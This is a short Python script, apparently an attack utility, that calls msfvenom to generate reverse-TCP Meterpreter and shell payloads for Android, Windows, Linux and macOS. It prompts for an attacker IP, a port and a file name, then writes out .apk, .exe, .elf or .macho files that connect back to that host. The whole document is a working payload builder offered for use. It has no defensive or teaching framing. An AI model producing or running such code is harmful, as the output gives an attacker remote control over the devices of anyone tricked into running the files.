import subprocess
def payloadgenerater():
    print("                                         ")
    ip = input("Enter the IP Address: ")
    port = input("Enter the Port Number: ")
    fn = input("Enter the Payload Name: ")

    print("1) Android Payload")
    print("2) Windows Payload")
    print("3) Linux Payload")
    print("4) Mac Payload")

    num = input("Enter the Option: ")

    if num == "1":
        # Generate Android payload
        print("         ")
        print("Generating Payload.....................")
        subprocess.call(["msfvenom","-p","android/meterpreter/reverse_tcp","LHOST=" + ip,"LPORT=" + port,"-o",fn+".apk"])
    elif num == "2":
        # Generate Windows payload
        print("         ")
        print("Generating Payload.....................")
        subprocess.run(["msfvenom","-p","windows/meterpreter/reverse_tcp","LHOST=" + ip,"LPORT=" + port,"-o",fn + ".exe"])
    elif num == "3":
        # Generate Linux payload
        print("         ")
        print("Generating Payload.....................")
        subprocess.run(["msfvenom","-p","linux/x86/meterpreter/reverse_tcp","LHOST=" + ip,"LPORT=" + port,"-o",fn + ".elf"])
    elif num == "4":
        # Generate Mac payload
        print("         ")
        print("Generating Payload.....................")
        subprocess.run(["msfvenom","-p","osx/x86/shell_reverse_tcp","LHOST=" + ip,"LPORT=" + port,"-o", fn + ".macho"])
    else:
        print("Invalid option selected.")